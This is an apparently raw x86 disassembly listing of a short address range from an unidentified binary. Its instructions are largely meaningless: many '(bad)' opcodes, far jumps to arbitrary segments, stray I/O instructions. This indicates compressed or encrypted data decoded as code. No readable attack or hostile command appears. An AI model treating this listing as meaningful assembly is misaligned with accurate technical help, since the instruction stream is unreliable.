  419283:	sbb    DWORD PTR [eax+edx*2+0x7370a808],ecx
  41928a:	dec    edx
  41928b:	mov    al,ds:0x56599473
  419290:	call   0x5473:0x9e487d68
  419297:	sub    BYTE PTR [edi+0x73],ch
  41929a:	dec    edx
  41929b:	and    BYTE PTR [esp+edx*4+0x43],bl
  41929f:	sbb    ebx,DWORD PTR [ebp-0x6c]
  4192a2:	pop    ecx
  4192a3:	cs push edx
  4192a5:	dec    eax
  4192a6:	pop    ebp
  4192a7:	sub    BYTE PTR [esi-0x5bd5abad],bh
  4192ad:	dec    edi
  4192ae:	jns    0x4192ca
  4192b0:	lods   eax,DWORD PTR ds:[esi]
  4192b1:	gs push esp
  4192b3:	xor    eax,0x256b6481
  4192b8:	mov    DWORD PTR [edx+0x54],esi
  4192bb:	adc    cl,BYTE PTR [edi+0x52]
  4192be:	aaa    
  4192bf:	das    
  4192c0:	mov    esi,0xb5273853
  4192c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192c6:	cmp    BYTE PTR [eax+0x283cb9db],dh
  4192cc:	dec    ecx
  4192cd:	push   ebp
  4192ce:	and    ebp,DWORD PTR [ebx+0x0]
	...
  4192e4:	dec    esi
  4192e5:	push   esi
  4192e6:	cmp    ecx,DWORD PTR [esp+ebx*8]
  4192e9:	mov    ebp,0x51bc1f47
  4192ee:	cmp    dl,BYTE PTR [esi]
  4192f0:	bound  ebp,QWORD PTR [ecx-0x6b7b01c3]
  4192f6:	pop    ecx
  4192f7:	scas   al,BYTE PTR es:[edi]
  4192f8:	push   ecx
  4192f9:	dec    eax
  4192fa:	pop    ebp
  4192fb:	test   al,0xbd
  4192fd:	push   ecx
  4192fe:	push   esp
  4192ff:	stos   BYTE PTR es:[edi],al
  419300:	fwait
  419301:	dec    ebp
  419302:	jns    0x41929e
  419304:	lods   al,BYTE PTR ds:[esi]
  419305:	arpl   WORD PTR [ebp+esi*4-0x80],dx
  419309:	imul   esp,DWORD PTR fs:[ebp-0x6dab8d78],0x50
  419311:	push   ebx
  419312:	inc    edi
  419313:	add    BYTE PTR [eax],bl
  419315:	lds    edi,FWORD PTR [ecx]
  419317:	xor    cl,BYTE PTR [ebp+ecx*8+0x49]
  41931b:	xor    DWORD PTR [edi],eax
  41931d:	les    esp,FWORD PTR [ecx]
  41931f:	xor    al,0xfa
  419321:	les    edi,FWORD PTR [ebx]
  419323:	sub    eax,0x393b5167
  419328:	adc    BYTE PTR [ebx+0x3c],0x38
  41932c:	xchg   ebx,eax
  41932e:	dec    edx
  41932f:	cmp    BYTE PTR [ebp+0x663237dd],al
  419335:	fwait
  419336:	or     BYTE PTR [edi-0x44],dh
  419339:	sub    DWORD PTR [ecx+0x66],0x727788c9
  419340:	mov    ebx,0xa3692681
  419345:	(bad)
	...
  419359:	add    BYTE PTR [eax],al
  41935b:	add    BYTE PTR [ecx+eax*4-0x77769997],bl
  419362:	es imul esp,ebx,0x79460890
  419369:	test   al,0x5e
  41936b:	outs   dx,DWORD PTR ds:[esi]
  41936c:	mov    WORD PTR [edi-0x38389a95],?
  419372:	push   0x74
  419374:	lds    edx,FWORD PTR [ecx-0x400aabb2]
  41937a:	arpl   WORD PTR [ecx-0x3c],di
  41937d:	mov    gs,WORD PTR [ecx+0x72]
  419380:	xchg   ebx,eax
  419381:	xchg   DWORD PTR [edi+0x0],esp
  419384:	icebp  
  419385:	mov    ds:0x86c36960,eax
  41938a:	push   edi
  41938b:	outs   dx,DWORD PTR ds:[esi]
  41938c:	retf   
  41938d:	popf   
  41938e:	arpl   WORD PTR es:[edx-0x74],dx
  419392:	or     BYTE PTR [esi+0x46],ch
  419395:	xor    BYTE PTR [edi],0x2e
  419398:	or     DWORD PTR [ebp-0x5ddcff9c],eax
  41939e:	push   edi
  41939f:	pop    edi
  4193a0:	mov    WORD PTR [ebx+ebx*1],?
  4193a3:	addr16 fdivr st,st(3)
  4193a6:	cmp    dl,BYTE PTR [ecx-0x41]
  4193a9:	cmp    ch,BYTE PTR ss:[eax-0x27]
  4193ad:	addr16 adc eax,0x915c36d
  4193b3:	dec    esi
  4193b4:	fisttp WORD PTR [edx]
  4193b6:	inc    edi
  4193b7:	pop    edi
  4193b8:	mov    edi,0xd333c660
  4193bd:	mov    bh,0x15
  4193bf:	popa   
	...
  4193d4:	mov    ebx,0x9942155f
  4193d9:	push   ebp
  4193da:	push   ss
  4193db:	arpl   WORD PTR [esi-0x30bcc805],bx
  4193e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193e2:	cmp    BYTE PTR [ebx+0x59],al
  4193e5:	xchg   BYTE PTR [esi],dh
  4193e7:	jb     0x419452
  4193e9:	pop    eax
  4193ea:	xor    DWORD PTR [ecx+esi*2-0x78],esi
  4193ee:	or     al,0x50
  4193f0:	inc    edi
  4193f1:	int3   
  4193f2:	fstp   DWORD PTR [ebx+edx*2-0x60]
  4193f6:	sbb    BYTE PTR [edi+0x72],al
  4193f9:	xchg   DWORD PTR ds:0x109c6a72,edx
  4193ff:	dec    ecx
  419400:	imul   edx,DWORD PTR [edi+esi*1+0x8ef3b6c],0xda2c5750
  41940b:	pop    esp
  41940c:	dec    ebp
  41940d:	rol    BYTE PTR [eax+ebp*2],1
  419410:	sub    ebp,ebx
  419412:	add    al,0x67
  419414:	das    
  419415:	fadd   QWORD PTR [ebx+eiz*2]
  419418:	mov    WORD PTR [ebx],gs
  41941a:	xor    BYTE PTR [edi],ch
  41941c:	pop    ebp
  41941d:	or     dh,BYTE PTR ds:0x16373352
  419423:	popa   
  419424:	(bad)  
  419425:	and    al,0x19
  419427:	je     0x4193b5
  419429:	or     eax,0x94bd2f30
  41942e:	into   
  41942f:	cmp    eax,0x308c71fe
  419434:	clc    
  419435:	jnp    0x4193ca
  419437:	add    eax,DWORD PTR [eax]
	...
  419449:	add    BYTE PTR [eax],al
  41944b:	add    BYTE PTR [esp+edx*4-0x6b73fc21],cl
  419452:	fild   WORD PTR [ebx]
  419454:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  41945b:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  419462:	fild   WORD PTR [ebx]
  419464:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  41946b:	add    ecx,DWORD PTR [edi+eiz*2+0x60b31850]
  419472:	inc    esp
  419473:	shl    DWORD PTR [ecx+0x70],1
  419476:	inc    ebx
  419477:	sbb    BYTE PTR [edi+eiz*2+0x606b1830],cl
  41947e:	dec    esp
  41947f:	rcr    DWORD PTR [eax+0x7b],1
  419482:	nop    DWORD PTR [edx-0x6c]
  419486:	adc    dl,BYTE PTR [ebx]
  419488:	js     0x419507
  41948a:	adc    ebx,DWORD PTR [edi]
  41948c:	popf   
  41948d:	dec    ebx
  41948e:	add    bl,BYTE PTR [eax]
  419490:	imul   esp,DWORD PTR [edi+0x4],0x3655d04
  419497:	sbb    eax,DWORD PTR [eax+0x71]
  41949a:	mov    dl,0x24
  41949c:	cmp    al,0x66
  41949e:	or     al,0x14
  4194a0:	pop    ebx
  4194a1:	les    ax,DWORD PTR [ebx]
  4194a4:	cmp    eax,0x201ac365
  4194a9:	jno    0x4194bd
  4194ab:	and    eax,0x13cc601d
	...
  4194c4:	mov    WORD PTR [edi-0x50],fs
  4194c7:	pop    ss
  4194c8:	sub    esp,DWORD PTR [eax-0x34]
  4194cb:	shr    al,1
  4194cd:	ja     0x4194d7
  4194cf:	(bad)  
  4194d0:	fwait
  4194d1:	arpl   WORD PTR [bx+0x76b0],di
  4194d6:	outs   dx,DWORD PTR ds:[esi]
  4194d7:	popf   
  4194d8:	xchg   edx,eax
  4194d9:	or     BYTE PTR gs:[edx-0x62a08782],bl
  4194e0:	and    BYTE PTR [ebp+0x78808a55],0x7b
  4194e7:	xchg   esp,eax
  4194e8:	jns    0x419533
  4194ea:	push   0xffffff8d
  4194ec:	mov    al,ds:0x9ae90876
  4194f1:	jns    0x419565
  4194f3:	jp     0x419493
  4194f5:	js     0x419556
  4194f7:	pop    ebp
  4194f8:	and    eax,0x1c4526a4
  4194fd:	jg     0x419507
  4194ff:	pop    edx
  419500:	sbb    DWORD PTR [edi+0x5f],edi
  419503:	push   ebp
  419504:	and    eax,0x185655a4
  419509:	jbe    0x419571
  41950b:	jmp    0x40a60f12
  419510:	add    al,0x76
  419512:	cmp    DWORD PTR [esi],ecx
  419514:	repz jle 0x41957c
  419517:	sbb    ah,ch
  419519:	jmp    0xc7c:0x71dc1879
  419520:	fwait
  419521:	dec    ecx
  419522:	js     0x41953f
  419524:	in     eax,0x7a
  419526:	addr16 sti 
	...
  41953c:	in     al,0xea
  41953e:	jns    0x419538
  419540:	mov    ebx,0x7b0c7c71
  419545:	dec    ecx
  419546:	jns    0x41953d
  419548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419549:	jp     0x419553
  41954b:	fidivr DWORD PTR [eax-0x4b2aa082]
  419551:	mov    ds:0x7e9eca55,eax
  419556:	jnp    0x419514
  419558:	popf   
  419559:	inc    edi
  41955a:	push   0x0
  41955c:	int3   
  41955d:	loop   0x4195c8
  41955f:	jae    0x4195d6
  419561:	jecxz  0x4195c8
  419563:	ins    BYTE PTR es:[edi],dx
  419564:	dec    esp
  419565:	loop   0x4195d0
  419567:	xor    ecx,DWORD PTR [edx]
  419569:	repz arpl WORD PTR [eax+edx*1-0x1b],bp
  41956e:	bound  ebx,QWORD PTR [edi+0x17]
  419571:	cli    
  419572:	arpl   WORD PTR [edx+0x75],sp
  419575:	xchg   esi,eax
  419576:	or     BYTE PTR [eax],al
  419578:	gs xchg esi,eax
  41957a:	or     BYTE PTR [eax],al
  41957c:	gs xchg esi,eax
  41957e:	or     BYTE PTR [eax],al
  419580:	xor    eax,0x35000896
  419585:	xchg   esi,eax
  419586:	or     BYTE PTR [eax],al
  419588:	and    eax,0x25000896
  41958d:	xchg   esi,eax
  41958e:	or     BYTE PTR [eax],al
  419590:	xor    eax,0x35000896
  419595:	xchg   esi,eax
  419596:	js     0x41960a
  419598:	pop    edx
  419599:	(bad)  
  41959a:	ins    DWORD PTR es:[edi],dx
  41959b:	ins    BYTE PTR es:[edi],dx
  41959c:	shl    cl,0x22
  41959f:	imul   eax,DWORD PTR [eax],0x0
	...
  4195b1:	add    BYTE PTR [eax],al
  4195b3:	add    BYTE PTR [ebx-0x9],bl
  4195b6:	hlt    
  4195b7:	dec    edi
  4195b8:	(bad)  
  4195b9:	in     eax,0x6a
  4195bb:	imul   edi,DWORD PTR [ecx-0x69b70b05],0x946c69c2
  4195c5:	in     al,dx
  4195c6:	ins    DWORD PTR es:[edi],dx
  4195c7:	jbe    0x419559
  4195c9:	nop
  4195ca:	pop    eax
  4195cb:	popa   
  4195cc:	cmp    eax,0xec844ff4
  4195d2:	ins    BYTE PTR es:[edi],dx
  4195d3:	push   esp
  4195d4:	call   0x76e5:0xb5657cdb
  4195db:	gs xchg ebx,eax
  4195dd:	loope  0x419601
  4195df:	push   0xffffffd6
  4195e1:	xchg   ebp,eax
  4195e2:	ja     0x41964d
  4195e4:	shl    bl,cl
  4195e6:	arpl   WORD PTR [esi-0x74],bp
  4195e9:	into   
  4195ea:	ss jno 0x41960a
  4195ed:	daa    
  4195ee:	in     al,0x73
  4195f0:	sub    ebx,edi
  4195f2:	std    
  4195f3:	data16 repz fyl2xp1 
  4195f7:	ins    DWORD PTR es:[edi],dx
  4195f8:	call   DWORD PTR [ecx-0x3ff8810]
  4195fe:	std    
  4195ff:	data16 jmp 0x419603
  419602:	cli    
  419603:	ins    DWORD PTR es:[edi],dx
  419604:	(bad)  
  419606:	ss je  0x4195ed
  419609:	pop    es
  41960a:	or     DWORD PTR [ecx-0x1b],esi
  41960d:	adc    dh,bh
  41960f:	ins    BYTE PTR es:[edi],dx
  419610:	loop   0x419680
  419612:	ds rcl BYTE PTR cs:[ebx],0xfd
  419617:	inc    DWORD PTR [eax]
	...
  419629:	add    BYTE PTR [eax],al
  41962b:	add    BYTE PTR [esi+0x2d],ch
  41962e:	out    dx,al
  41962f:	jmp    FWORD PTR [esi+0x2d]
  419632:	in     eax,dx
  419633:	jmp    FWORD PTR [esi-0x73]
  419636:	in     eax,dx
  419637:	(bad)  
  419638:	mov    esi,0xcf42d8b0
  41963d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41963e:	sub    al,0x68
  419640:	stos   DWORD PTR es:[edi],eax
  419641:	dec    esi
  419642:	lock ins DWORD PTR es:[edi],dx
  419644:	lods   eax,DWORD PTR ds:[esi]
  419645:	inc    eax
  419646:	in     eax,dx
  419647:	sub    ebp,DWORD PTR [eax+edx*2-0x5b819f06]
  41964e:	cld    
  41964f:	jae    0x4196c2
  419651:	dec    edi
  419652:	fnsave [eax+0x69]
  419655:	(bad)  
  419656:	cli    
  419657:	pop    esi
  419658:	jns    0x4195ea
  41965a:	cmp    BYTE PTR [eax],ah
  41965c:	imul   edx,DWORD PTR [ecx-0x74aa8e15],0x8b6862f0
  419666:	jmp    0xf823d5db
  41966b:	jno    0x419695
  41966d:	fstp   TBYTE PTR [esi+0x2c884b51]
  419673:	imul   esp,DWORD PTR [ebx],0xffffff94
  419676:	jmp    0xcebace5b
  41967b:	jmp    0x6632:0xc9df6531
  419682:	int3   
  419683:	jmp    0xe02102a8
  419688:	(bad)  
  419689:	ja     0x419654
  41968b:	jmp    0x0:0xdfc078f7
	...
  4196a2:	add    BYTE PTR [eax],al
  4196a4:	sar    DWORD PTR [ebp-0x4f],1
  4196a7:	out    0xe9,al
  4196a9:	ja     0x419652
  4196ab:	fild   QWORD PTR [ebx+0x43]
  4196ae:	xchg   cl,ch
  4196b0:	fistp  WORD PTR [edi-0x80]
  4196b3:	cmc    
  4196b4:	out    dx,al
  4196b5:	dec    eax
  4196b6:	xchg   esp,eax
  4196b7:	lock aad 0x7d
  4196ba:	fwait
  4196bb:	out    dx,eax
  4196bc:	jmp    0x8594:0x772ec494
  4196c3:	imul   DWORD PTR [ebx-0x73cf4956]
  4196c9:	jl     0x41971e
  4196cb:	clc    
  4196cc:	mov    ebx,0x8c3106aa
  4196d1:	jl     0x419726
  4196d3:	clc    
  4196d4:	stos   DWORD PTR es:[edi],eax
  4196d5:	arpl   WORD PTR [ecx],bx
  4196d7:	xor    DWORD PTR [ecx-0x6c],esp
  4196da:	inc    ebp
  4196db:	clc    
  4196dc:	jnp    0x419694
  4196de:	fucomip st,st(1)
  4196e0:	push   0x62
  4196e2:	inc    esp
  4196e3:	retf   0x445f
  4196e6:	xor    ch,bl
  4196e8:	jg     0x41975b
  4196ea:	adc    dh,BYTE PTR [edx]
  4196ec:	jo     0x419763
  4196ee:	sbb    eax,DWORD PTR [edi*1+0x68cf0071]
  4196f5:	jbe    0x419701
  4196f7:	out    0x5a,eax
  4196f9:	xchg   esp,eax
  4196fa:	sub    ecx,edi
  4196fc:	cmp    BYTE PTR [edx+0x18],ch
  4196ff:	lock aaa 
  419701:	jne    0x41970b
  419703:	adc    eax,0x1c6772e1
	...
  41971c:	mov    ebp,0xa6cc6179
  419721:	dec    ebx
  419722:	or     BYTE PTR [edi-0x3d96874d],ah
  419728:	(bad)
  41972c:	pushf  
  41972d:	je     0x419790
  41972f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419730:	push   ecx
  419731:	gs gs mov dh,0x78
  419735:	jb     0x4197b1
  419737:	xchg   ebp,eax
  419738:	(bad)  
  419739:	pop    ebx
  41973a:	gs mov bl,0x66
  41973d:	jnp    0x4197a3
  41973f:	mov    BYTE PTR [edi+0x618e4348],cl
  419745:	outs   dx,BYTE PTR ds:[esi]
  419746:	test   DWORD PTR fs:[esi+0x4b],ebp
  41974a:	pop    eax
  41974b:	fwait
  41974c:	pop    esp
  41974d:	jno    0x4197ae
  41974f:	xchg   ebp,eax
  419750:	xor    ah,BYTE PTR [esp+edx*2-0x17]
  419754:	pop    eax
  419755:	js     0x4197c5
  419757:	jge    0x41978d
  419759:	inc    esi
  41975a:	jp     0x4196e0
  41975c:	push   ebx
  41975d:	pop    ebx
  41975e:	imul   ecx,DWORD PTR [edi+ebp*1+0x6f],0x4e
  419763:	xor    eax,0x5947e738
  419768:	and    BYTE PTR [ebx+0x5f],dl
  41976b:	pop    ebx
  41976c:	mov    BYTE PTR [eax+0x65],bl
  41976f:	dec    edx
  419770:	icebp  
  419771:	jp     0x4197bf
  419773:	push   eax
  419774:	(bad)  
  419775:	out    0x66,al
  419777:	inc    esi
  419778:	jmp    0x4197f5
  41977a:	arpl   WORD PTR [eax-0x2],cx
  41977d:	jnp    0x4197a5
  41977f:	or     eax,0x0
	...
  419794:	icebp  
  419795:	bound  ecx,QWORD PTR [eax]
  419797:	cmp    dh,cl
  419799:	bound  ebp,QWORD PTR [ebx+0x20]
  41979c:	jmp    0x5850:0xb8bf6570
  4197a3:	add    BYTE PTR [ebp-0x6c96972b],dh
  4197a9:	nop
  4197aa:	dec    esi
  4197ab:	popa   
  4197ac:	mov    ebx,0xb96976f5
  4197b1:	sti    
  4197b2:	ja     0x4197e2
  4197b4:	(bad)  
  4197b6:	js     0x4197b8
  4197b8:	(bad)  
  4197ba:	bound  eax,QWORD PTR [esi-0x27]
  4197bd:	ret    0x72f4
  4197c0:	int3   
  4197c1:	fisubr WORD PTR [ecx+0x73]
  4197c4:	mov    ds:0x360066fc,eax
  4197c9:	(bad)  
  4197ca:	push   edi
  4197cb:	dec    ecx
  4197cc:	sub    esi,eax
  4197ce:	outs   dx,DWORD PTR ds:[esi]
  4197cf:	xor    DWORD PTR [ebx+edx*8+0x25],esi
  4197d3:	inc    esp
  4197d4:	dec    edx
  4197d5:	sahf   
  4197d6:	and    eax,0x39a9342d
  4197db:	inc    edx
  4197dc:	push   eax
  4197dd:	mov    eax,ds:0xa5376425
  4197e2:	xor    BYTE PTR [ecx+0x4d],al
  4197e5:	mov    ds:0xaa053021,al
  4197ea:	cmp    BYTE PTR [ecx-0x17],al
  4197ed:	shl    DWORD PTR [edi],cl
  4197ef:	xor    ch,bl
  4197f1:	iret   
  4197f2:	cmp    BYTE PTR [ebp-0x2f],bh
  4197f5:	xlat   BYTE PTR ds:[ebx]
  4197f6:	bound  edx,QWORD PTR [eax+0x0]
	...
  419809:	add    BYTE PTR [eax],al
  41980b:	add    bh,al
  41980d:	cmc    
  41980e:	addr16 push ebx
  419810:	enter  0x7ae2,0x65
  419814:	mov    bh,0xa1
  419816:	cmp    al,BYTE PTR [eax]
  419818:	(bad)  
  419819:	sti    
  41981a:	jbe    0x419892
  41981c:	dec    eax
  41981d:	loop   0x419896
  41981f:	cs mov ebp,0x810060e3
  419825:	into   
  419826:	pop    eax
  419827:	push   eax
  419828:	mov    edx,0x887478fb
  41982d:	loop   0x419823
  41982f:	inc    esp
  419830:	mov    WORD PTR [edx-0x36919c30],gs
  419836:	and    ah,BYTE PTR [ebp+ebp*1-0x19]
  41983a:	or     BYTE PTR [edi+0x48],cl
  41983d:	pushf  
  41983e:	lock pop esi
  419840:	push   0xffffff97
  419842:	jmp    0x4198b7
  419844:	mov    WORD PTR [edi-0x35df8f41],ss
  41984a:	in     eax,0x65
  41984c:	sbb    BYTE PTR [edi],ah
  41984e:	int3   
  41984f:	dec    ebx
  419850:	push   edx
  419851:	daa    
  419852:	fcos   
  419854:	inc    esp
  419855:	and    eax,0xbdfe62fd
  41985a:	fbstp  TBYTE PTR [ebx-0x54]
  41985d:	xor    cl,dh
  41985f:	outs   dx,DWORD PTR ds:[esi]
  419860:	call   0xfea48f33
  419865:	sti    
  419866:	frstor [esi-0x6]
  419869:	add    al,0xe3
  41986b:	(bad)  
  41986c:	fdivr  DWORD PTR [edx]
  41986e:	in     al,dx
  41986f:	pusha  
	...
  419884:	in     al,0x18
  419886:	retf   0xe971
  419889:	pavgb  mm5,QWORD PTR [ebp-0x40]
  41988d:	add    al,0xec
  41988f:	imul   edi,DWORD PTR [edi+0x6c50d7fb],0x34
  419896:	rcr    BYTE PTR [edi],0xca
  419899:	(bad)  
  41989a:	fcomp  DWORD PTR [edi]
  41989c:	mov    esp,0x9b70f75c
  4198a1:	push   esi
  4198a2:	cli    
  4198a3:	arpl   WORD PTR [edi-0x32b03305],bx
  4198a9:	stos   DWORD PTR es:[edi],eax
  4198aa:	sar    DWORD PTR [ecx],0xac
  4198ad:	sti    
  4198ae:	enter  0xbb49,0xe7
  4198b2:	ins    BYTE PTR es:[edi],dx
  4198b3:	mov    edx,0x7bb3cbcb
  4198b8:	mov    WORD PTR [ecx],ss
  4198ba:	or     al,0x67
  4198bc:	push   edx
  4198bd:	xchg   esp,eax
  4198be:	popf   
  4198bf:	ret    
  4198c0:	push   ebp
  4198c1:	popf   
  4198c2:	shl    DWORD PTR [edi+0x16],cl
  4198c5:	aad    0xef
  4198c7:	mov    esp,0x4499457
  4198cc:	xor    ecx,DWORD PTR [esi-0x63]
  4198cf:	ret    0x9d55
  4198d2:	mov    bl,0x67
  4198d4:	not    ah
  4198d6:	iret   
  4198d7:	mov    esp,0x4499437
  4198dc:	xor    ecx,DWORD PTR [esi+0x5d]
  4198df:	cmp    eax,0x26df948c
  4198e4:	pop    esp
  4198e5:	mov    ds:0x3b7,al
	...
  4198fa:	add    BYTE PTR [eax],al
  4198fc:	cmp    eax,0xf7cd75
  419901:	jbe    0x4198b4
  419903:	out    0xe7,al
  419905:	push   ecx
  419906:	fsub   st,st(0)
  419908:	std    
  419909:	jae    0x4198bd
  41990b:	in     al,dx
  41990c:	jmp    0xfa0c1c79
  419911:	push   0x79f1f184
  419916:	fwait
  419917:	and    ecx,edi
  419919:	pop    esp
  41991a:	(bad)  
  41991b:	out    dx,eax
  41991c:	loopne 0x419984
  41991e:	mov    ecx,?
  419920:	out    0x4d,eax
  419922:	popf   
  419923:	imul   DWORD PTR [esi-0x2e157c90]
  419929:	jae    0x41999c
  41992b:	out    dx,al
  41992c:	mov    esp,0xb8f79240
  419931:	inc    ax
  419933:	in     eax,0xae
  419935:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419936:	fild   WORD PTR [ebx]
  419938:	mov    WORD PTR [edi+ebx*8-0x2089ec1e],ss
  41993f:	out    0xb,al
  419941:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419942:	fistp  QWORD PTR [ebx]
  419944:	mov    WORD PTR [edx+0x7a8c3adf],gs
  41994a:	or     cl,ch
  41994c:	mov    ds:0xede92f94,al
  419951:	jecxz  0x41998b
  419953:	jmp    0xe9652df0
  419958:	mov    ds:0xebe96994,eax
  41995d:	jecxz  0x41998e
  41995f:	jmp    0x419964
	...
  419974:	jp     0x41990a
  419976:	addr16 jmp 0xe97d2df8
  41997c:	ja     0x419912
  41997e:	and    ebp,ecx
  419980:	lods   al,BYTE PTR ds:[esi]
  419981:	jecxz  0x4199b9
  419983:	jmp    0xe9712de5
  419988:	pop    edi
  419989:	xchg   esp,eax
  41998a:	cmp    al,0xe9
  41998c:	mov    bl,0xe3
  41998e:	jmpw   0x7d40
  419992:	cmp    eax,0x3de371e9
  419997:	jmp    0xd0852e2b
  41999c:	ins    BYTE PTR es:[edi],dx
  41999d:	gs gs mov edx,0x8e7c7960
  4199a4:	inc    eax
  4199a5:	jp     0x419a0d
  4199a7:	mov    al,0x71
  4199a9:	jbe    0x419a27
  4199ab:	mov    esi,0x9d6e94a5
  4199b0:	pop    edi
  4199b1:	popf   
  4199b2:	and    eax,0x65458fbe
  4199b7:	(bad)  
  4199b8:	cmp    ebp,DWORD PTR [eax+0x67]
  4199bb:	jnp    0x4199ef
  4199bd:	aas    
  4199be:	inc    edi
  4199bf:	lea    esp,[eax]
  4199c1:	jne    0x419a2e
  4199c3:	lea    ecx,[eax+esi*2+0x63]
  4199c7:	push   esp
  4199c8:	aaa    
  4199c9:	jno    0x4199d3
  4199cb:	cmp    ch,BYTE PTR [ecx]
  4199cd:	imul   edi,DWORD PTR [bp+si],0x2d
  4199d1:	gs jle 0x419a18
  4199d4:	add    ah,BYTE PTR [eax+ecx*1+0x0]
	...
  4199ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199ed:	icebp  
  4199ee:	js     0x419a55
  4199f0:	xchg   esi,eax
  4199f1:	cmc    
  4199f2:	jbe    0x419a6a
  4199f4:	inc    eax
  4199f5:	jmp    0x6f4c:0xbc512514
  4199fc:	xchg   ah,ah
  4199fe:	hlt    
  4199ff:	push   edx
  419a00:	jl     0x4199e6
  419a02:	imul   edx,DWORD PTR [ebx-0x80],0xa7657aea
  419a09:	mov    eax,0xc7696429
  419a0e:	imul   esp,DWORD PTR [edx-0x60],0x960060ea
  419a15:	icebp  
  419a16:	js     0x419a7d
  419a18:	xchg   ch,dh
  419a1a:	jbe    0x419a92
  419a1c:	shr    al,1
  419a1e:	adc    al,0x25
  419a20:	ror    edx,1
  419a22:	push   esi
  419a23:	gs enter 0x78ed,0x65
  419a28:	xchg   ebp,eax
  419a29:	aam    0x6d
  419a2b:	jb     0x419a7d
  419a2d:	sti    
  419a2e:	js     0x419a9f
  419a30:	aaa    
  419a31:	loope  0x419a27
  419a33:	push   edx
  419a34:	dec    esp
  419a35:	repnz imul edx,DWORD PTR [ebx+0x50],0x7657ae8
  419a3d:	mov    dh,0x29
  419a3f:	fs dec eax
  419a41:	lds    esi,FWORD PTR [edi+0x65]
  419a44:	not    DWORD PTR [ebp-0xade96a9]
  419a4a:	push   edi
  419a4b:	gs (bad) 
  419a4d:	jecxz  0x419ab8
  419a4f:	jb     0x419a51
	...
  419a61:	add    BYTE PTR [eax],al
  419a63:	add    BYTE PTR [ebp-0x4b],al
  419a66:	ins    BYTE PTR es:[edi],dx
  419a67:	sub    eax,0x7269eb10
  419a6c:	push   ebp
  419a6d:	(bad)  
  419a6e:	pop    ebx
  419a6f:	add    BYTE PTR [eax-0x2fb4af17],dl
  419a75:	fbld   TBYTE PTR [edi+0x68]
  419a78:	mov    WORD PTR [ebx+eiz*8+0x6d],cs
  419a7c:	mov    WORD PTR [esi+0x7e6973e3],ds
  419a82:	out    0x71,eax
  419a84:	sbb    BYTE PTR [eax-0x2],0x1f
  419a88:	test   eax,0x5250d04f
  419a8d:	xchg   esp,ebx
  419a8f:	dec    DWORD PTR [edi-0x70]
  419a92:	loopne 0x419b06
  419a94:	push   esp
  419a95:	cwde   
  419a96:	retf   0x3c53
  419a99:	jmp    0x419a98
  419a9b:	inc    ax
  419a9d:	cwde   
  419a9e:	std    
  419a9f:	sub    eax,0xffe08844
  419aa4:	bound  ebx,QWORD PTR [eax-0x73b7e012]
  419aaa:	clc    
  419aab:	pop    esi
  419aac:	mov    WORD PTR [edi-0x1f],?
  419aaf:	fs xor eax,0x2d4428c9
  419ab5:	(bad)  
  419ab6:	jmp    0x419ab7
  419ab8:	ds sbb al,0xcd
  419abb:	data16 add cl,bl
  419abe:	sub    BYTE PTR [esi-0xd],ah
  419ac1:	sbb    eax,0x8c005ee0
  419ac6:	cmp    eax,0x0
	...
  419adb:	add    al,bh
  419add:	int3   
  419ade:	jmp    0xb500:0x20ebf16b
  419ae5:	jmp    0x419b0f
  419ae7:	add    bh,cl
  419ae9:	xor    bh,BYTE PTR [edi-0x33e247b0]
  419aef:	inc    esi
  419af0:	fisub  DWORD PTR [edi]
  419af2:	or     DWORD PTR [eax-0x22],edx
  419af5:	and    al,0xc0
  419af7:	fidiv  WORD PTR ds:[ecx+ecx*1]
  419afb:	push   ebx
  419afc:	ret    0xdc34
  419aff:	push   edx
  419b00:	shr    ebx,1
  419b02:	int    0x47
  419b04:	leave  
  419b05:	xchg   esp,eax
  419b06:	and    cl,ch
  419b08:	sbb    edx,DWORD PTR [edi+0x26]
  419b0b:	(bad)  
  419b0c:	into   
  419b0d:	dec    ebx
  419b0e:	es retf 0xe10b
  419b12:	xor    ch,cl
  419b14:	push   0xfbf55d6b
  419b19:	jno    0x419b4c
  419b1b:	jmp    0x419b85
  419b1d:	imul   ecx,DWORD PTR [ebp-0x27],0x5e
  419b21:	xor    ax,WORD PTR [esp+ebx*2]
  419b25:	jae    0x419b39
  419b27:	cmc    
  419b28:	pusha  
  419b29:	jno    0x419b3c
  419b2b:	loopne 0x419b5d
  419b2d:	push   0x0
  419b2f:	call   0xef211272
  419b34:	cmp    al,0x77
  419b36:	icebp  
  419b37:	jmp    0xd94e0a96
  419b3c:	cmp    DWORD PTR [ebx+0xb],esi
  419b3f:	out    dx,eax
	...
  419b54:	cs xchg esp,eax
  419b56:	or     eax,0x1e9e33f0
  419b5b:	sub    DWORD PTR [esp+ebp*2-0x61dc1025],ecx
  419b62:	push   cs
  419b63:	sub    DWORD PTR [esp+ebp*2+0x63f3efdb],ecx
  419b6a:	or     DWORD PTR [ecx],ebp
  419b6c:	test   eax,0xe0c09394
  419b71:	outs   dx,DWORD PTR ds:[esi]
  419b72:	(bad)  
  419b73:	out    0xee,eax
  419b75:	inc    eax
  419b76:	mov    ds:0x9c6fddeb,al
  419b7b:	ficomp WORD PTR [ebx+0x3c]
  419b7e:	mov    ds:0x8c6fddeb,al
  419b83:	jmp    0x6ccc:0xd7df71be
  419b8a:	jno    0x419b74
  419b8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b8d:	jns    0x419b1e
  419b8f:	out    0xbe,eax
  419b91:	arpl   WORD PTR [eax],cx
  419b93:	jmp    0x75b00cd8
  419b98:	sbb    al,0x3f
  419b9a:	jp     0x419be8
  419b9c:	xor    al,0x55
  419b9e:	pusha  
  419b9f:	pop    ebx
  419ba0:	and    eax,0xf4396b6b
  419ba5:	bound  edi,QWORD PTR [ecx-0x17]
  419ba8:	(bad)  
  419ba9:	jno    0x419c24
  419bab:	cmp    eax,0x1e646bef
  419bb0:	int3   
  419bb1:	jbe    0x419c2d
